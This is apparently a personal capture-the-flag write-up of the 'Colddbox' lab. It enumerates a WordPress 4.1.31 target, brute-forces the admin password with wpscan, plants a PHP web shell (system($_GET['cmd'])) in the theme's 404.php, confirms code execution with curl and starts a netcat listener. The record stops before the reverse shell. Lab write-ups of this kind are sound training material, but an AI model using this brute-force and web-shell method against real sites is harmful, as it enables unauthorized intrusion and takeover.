# Colddbox Write up
connected via VPN with kali linux, target ip is 10.112.160.35; attack box / kali IP is 192.168.135.195 (internal VPN)
## Goal 
Get the user.txt and the root.txt flags.
## User.txt flag
### Hints
"Provide the flag in its encoded format" so the flag is encoded and not in the typical THM{FLAG} formatting, it's an older room.
### Enumeration
Start with nmap and gobuster
#### nmap
Started a full port scan with service and version detection flags. 
Findings: 
- an unusual ssh port at 4512
- on port 80 there is a WordPress app on Version 4.1.31

----
➜  colddbox nmap -sC -sV -p- 10.112.160.35             
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-02 16:18 -0400
Nmap scan report for 10.112.160.35
Host is up (0.033s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: ColddBox | One more machine
|_http-generator: WordPress 4.1.31
|_http-server-header: Apache/2.4.18 (Ubuntu)
4512/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4e:bf:98:c0:9b:c5:36:80:8c:96:e8:96:95:65:97:3b (RSA)
|   256 88:17:f1:a8:44:f7:f8:06:2f:d3:4f:73:32:98:c7:c5 (ECDSA)
|_  256 f2:fc:6c:75:08:20:b1:b2:51:2d:94:d6:94:d7:51:4f (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.80 seconds

------

#### gobuster
gobuster scan with the common.txt wordlist
findings: /hidden and /wp-admin directories. 
Also /wp-content and /wp-includes directories, which don't seem to be intersting at first glance. 
But /wp-media/ might come in handy later, if we can get admin access and upload files.

#### /hidden/

I checked /hidden/ first, which gives a webpage:
"
U-R-G-E-N-T
C0ldd, you changed Hugo's password, when you can send it to him so he can continue uploading his articles. Philip
"
Source did not reveal anymore secrets, but we now have three possible users:
- C0ldd
- Hugo
- Philip

#### /wp-admin/

On the /wp-admin/ page we have a login-page with username, password, a Log In prompt, the Remember Me Checkbox and a lost-password-functionality.
we might have usernames, but no passwords. Looking at the lost password-functionality we can use a username or E-mail to reset a password. 
As we have a Username (C0ldd from the /hidden/ message) we can try to send this and catch the response, maybe we can learn from that before we try any exploits (we know the version-number of WP from nmap).

#### burp suite password recovery
started burp suite with standard options, temporary project
opened the http://10.112.160.35/wp-login.php?action=lostpassword page via proxy, used username C0ldd and sent the intercepted request to the repeater. The response was an error page:
"The e-mail coud not be sent. Possible reason: your host may have diabled the mail() function"
The response was (only headers:)

HTTP/1.1 500 Internal Server Error
Date: Sat, 02 May 2026 20:32:10 GMT
Server: Apache/2.4.18 (Ubuntu)
Expires: Wed, 11 Jan 1984 05:00:00 GMT
Cache-Control: no-cache, must-revalidate, max-age=0
Pragma: no-cache
Set-Cookie: wordpress_test_cookie=WP+Cookie+check; path=/
X-Frame-Options: SAMEORIGIN
Content-Length: 3015
Connection: close
Content-Type: text/html; charset=utf-8

There was also a comment in the source to a ticket #11289 "<!DOCTYPE html>
"<!-- Ticket #11289, IE bug fix: always pad the error page with enough characters such that it is greater than 512 bytes, even after gzip compression (SNIPPED)" and then filled with random characters which did not look like any encoding i knew, just random characters to fill the 512 bytes i guess. 
So this might have been a dead end, as we did not get a response with a link or anything useful, since the password recovery function might be disabled.

I tried a 'wrong' username (C0ld) and we got a different response:

"HTTP/1.1 200 OK
Date: Sat, 02 May 2026 20:44:55 GMT
Server: Apache/2.4.18 (Ubuntu)
Expires: Wed, 11 Jan 1984 05:00:00 GMT
Cache-Control: no-cache, must-revalidate, max-age=0
Pragma: no-cache
Set-Cookie: wordpress_test_cookie=WP+Cookie+check; path=/
X-Frame-Options: SAMEORIGIN
Vary: Accept-Encoding
Content-Length: 3001
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8"
and "Invalid username or e-mail."

which #confirms# that C0ldd is a real username, as the webapp tried to use the mail()-function. 


#### pivot to looking for a vulnerability for the WP version
searchsploit revealed some exploits, though i am not sure which one to use, on first sight, none seems to fit perfectly which is the norm with THM CTFs

➜  colddbox searchsploit "WordPress 4.1.31"
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                       |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
NEX-Forms WordPress plugin < 7.9.7 - Authenticated SQLi                                                                                                                              | php/webapps/51042.txt
WordPress Core < 4.7.1 - Username Enumeration                                                                                                                                        | php/webapps/41497.php
WordPress Core < 4.7.4 - Unauthorized Password Reset                                                                                                                                 | linux/webapps/41963.txt
WordPress Core < 4.9.6 - (Authenticated) Arbitrary File Deletion                                                                                                                     | php/webapps/44949.txt
WordPress Core < 5.2.3 - Viewing Unauthenticated/Password/Private Posts                                                                                                              | multiple/webapps/47690.md
WordPress Core < 5.3.x - 'xmlrpc.php' Denial of Service                                                                                                                              | php/dos/47800.py
WordPress File Upload Plugin < 4.23.3 - Stored XSS                                                                                                                                   | php/webapps/51899.txt
WordPress Plugin Database Backup < 5.2 - Remote Code Execution (Metasploit)                                                                                                          | php/remote/47187.rb
WordPress Plugin DZS Videogallery < 8.60 - Multiple Vulnerabilities                                                                                                                  | php/webapps/39553.txt
WordPress Plugin EZ SQL Reports < 4.11.37 - Multiple Vulnerabilities                                                                                                                 | php/webapps/38176.txt
WordPress Plugin iThemes Security < 7.0.3 - SQL Injection                                                                                                                            | php/webapps/44943.txt
WordPress Plugin Rest Google Maps < 7.11.18 - SQL Injection                                                                                                                          | php/webapps/48918.sh
WordPress Plugin User Role Editor < 4.25 - Privilege Escalation                                                                                                                      | php/webapps/44595.rb
WordPress Plugin Userpro < 4.9.17.1 - Authentication Bypass                                                                                                                          | php/webapps/43117.txt
WordPress Plugin UserPro < 4.9.21 - User Registration Privilege Escalation

#### bruteforcing
might be a way to do it, as we have a login form (and ssh) and three usernames.
also as we know there is WP, we can use WPScanner to find specific vulnerabilities

colddbox wpscan --url http://10.112.160.35 -e u,vp,vt
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
                               
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] Updating the Database ...
[i] Update completed.

[+] URL: http://10.112.160.35/ [10.112.160.35]
[+] Started: Sat May  2 17:02:43 2026

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.112.160.35/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.112.160.35/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.112.160.35/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.1.31 identified (Insecure, released on 2020-06-10).
 | Found By: Rss Generator (Passive Detection)
 |  - http://10.112.160.35/?feed=rss2, <generator>https://wordpress.org/?v=4.1.31</generator>
 |  - http://10.112.160.35/?feed=comments-rss2, <generator>https://wordpress.org/?v=4.1.31</generator>

[+] WordPress theme in use: twentyfifteen
 | Location: http://10.112.160.35/wp-content/themes/twentyfifteen/
 | Last Updated: 2025-12-03T00:00:00.000Z
 | Readme: http://10.112.160.35/wp-content/themes/twentyfifteen/readme.txt
 | [!] The version is out of date, the latest version is 4.1
 | Style URL: http://10.112.160.35/wp-content/themes/twentyfifteen/style.css?ver=4.1.31
 | Style Name: Twenty Fifteen
 | Style URI: https://wordpress.org/themes/twentyfifteen
 | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.112.160.35/wp-content/themes/twentyfifteen/style.css?ver=4.1.31, Match: 'Version: 1.0'

[+] Enumerating Vulnerable Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:00:04 <=======================================================================================================================================> (652 / 652) 100.00% Time: 00:00:04
[+] Checking Theme Versions (via Passive and Aggressive Methods)

[i] No themes Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <=========================================================================================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] the cold in person
 | Found By: Rss Generator (Passive Detection)

[+] c0ldd
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] hugo
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] philip
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Sat May  2 17:02:52 2026
[+] Requests Done: 727
[+] Cached Requests: 10
[+] Data Sent: 187.435 KB
[+] Data Received: 23.534 MB
[+] Memory used: 288.797 MB
[+] Elapsed time: 00:00:09

So we did find something, but as we already have the admin user, lets bruteforce it
 colddbox wpscan --url http://10.112.160.35 -U C0ldd -P /usr/share/wordlists/rockyou.txt
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.112.160.35/ [10.112.160.35]
[+] Started: Sat May  2 17:06:20 2026

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.112.160.35/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.112.160.35/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.112.160.35/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.1.31 identified (Insecure, released on 2020-06-10).
 | Found By: Rss Generator (Passive Detection)
 |  - http://10.112.160.35/?feed=rss2, <generator>https://wordpress.org/?v=4.1.31</generator>
 |  - http://10.112.160.35/?feed=comments-rss2, <generator>https://wordpress.org/?v=4.1.31</generator>

[+] WordPress theme in use: twentyfifteen
 | Location: http://10.112.160.35/wp-content/themes/twentyfifteen/
 | Last Updated: 2025-12-03T00:00:00.000Z
 | Readme: http://10.112.160.35/wp-content/themes/twentyfifteen/readme.txt
 | [!] The version is out of date, the latest version is 4.1
 | Style URL: http://10.112.160.35/wp-content/themes/twentyfifteen/style.css?ver=4.1.31
 | Style Name: Twenty Fifteen
 | Style URI: https://wordpress.org/themes/twentyfifteen
 | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.112.160.35/wp-content/themes/twentyfifteen/style.css?ver=4.1.31, Match: 'Version: 1.0'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:01 <========================================================================================================================================> (137 / 137) 100.00% Time: 00:00:01

[i] No Config Backups Found.

[+] Performing password attack on Wp Login against 1 user/s
[SUCCESS] - C0ldd / (REDACTED)                                                                                                                                                                                      
Trying C0ldd / 9876543210 Time: 00:00:24 <                                                                                                                                    > (1225 / 14345617)  0.00%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: C0ldd, Password: 9876543210

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Sat May  2 17:06:49 2026
[+] Requests Done: 1366
[+] Cached Requests: 36
[+] Data Sent: 443.166 KB
[+] Data Received: 4.514 MB
[+] Memory used: 299.289 MB
[+] Elapsed time: 00:00:28

So with the #password# of the user C0ld found, we can login to the admin dashboard /wp-admin/

### WP admin dashboard

We're in the wordpress admin dashboard, where we can snoop around. Under Media we can drop files, so this might be a way to execute a remote shell, if we can access it remotely. 
I created a test-textfile, but did not know how to access it. 
So i asked chatgpt and googled, since I don't know the WP admin dashboard really works. ChatGPT suggested to change an existing .php-file via editor.

So i added a test-command into 404.php:

system($_GET['cmd']);

and used curl to trigger it:
colddbox curl "http://10.112.160.35/wp-content/themes/twentyfifteen/404.php?cmd=id"

result was:

uid=33(www-data) gid=33(www-data) groups=33(www-data)

So we have RCE confirmed. Now we need a reverse shell.

### Reverse shell
started listener on my kali
nc -lvnp 4444

####
To be continued

